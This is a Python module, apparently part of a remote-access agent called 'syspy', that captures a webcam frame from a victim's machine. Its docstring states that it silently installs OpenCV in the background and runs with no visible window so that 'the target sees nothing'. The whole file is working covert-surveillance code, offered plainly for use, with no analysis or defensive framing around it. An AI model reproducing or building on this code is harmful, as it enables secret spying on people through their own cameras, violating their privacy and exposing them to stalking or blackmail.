"""Webcam capture.

OpenCV is not bundled, so the first capture triggers a silent, headless
install into the agent's private runtime (see :mod:`syspy.agent.deps`).
Everything runs with ``CREATE_NO_WINDOW``; the target sees nothing.
"""

from __future__ import annotations

import os
import time
from typing import Callable, Optional

from . import deps

IS_WINDOWS = os.name == "nt"


def capture(index: int = 0,
            notify: Optional[Callable[[str], None]] = None) -> tuple[bytes | None, str]:
    """Grab a single JPEG frame from a camera.

    Args:
        index: camera index, ``0`` is the default webcam.
        notify: optional progress callback (usually ``agent.reply``).

    Returns:
        ``(jpeg_bytes, message)``.  ``jpeg_bytes`` is ``None`` on failure.
    """
    ok, detail = deps.ensure("cv2", notify)
    if not ok:
        return None, f"webcam unavailable - {detail}"

    try:
        import cv2  # type: ignore
    except Exception as error:
        return None, f"opencv installed but not importable ({error})"

    camera = None
    try:
        backend = cv2.CAP_DSHOW if IS_WINDOWS else 0
        camera = cv2.VideoCapture(index, backend)

        frame = None
        for _ in range(10):
            grabbed, frame = camera.read()
            if grabbed and frame is not None:
                break
            time.sleep(0.2)

        if frame is None:
            return None, "camera busy or not present"

        encoded_ok, encoded = cv2.imencode(".jpg", frame, [int(cv2.IMWRITE_JPEG_QUALITY), 88])
        if not encoded_ok:
            return None, "JPEG encoding failed"
        return encoded.tobytes(), "webcam.jpg"
    except Exception as error:
        return None, f"camera error: {error}"
    finally:
        try:
            if camera is not None:
                camera.release()
        except Exception:
            pass


def available() -> bool:
    """Whether OpenCV is already importable (does not trigger an install)."""
    return deps.have("cv2")
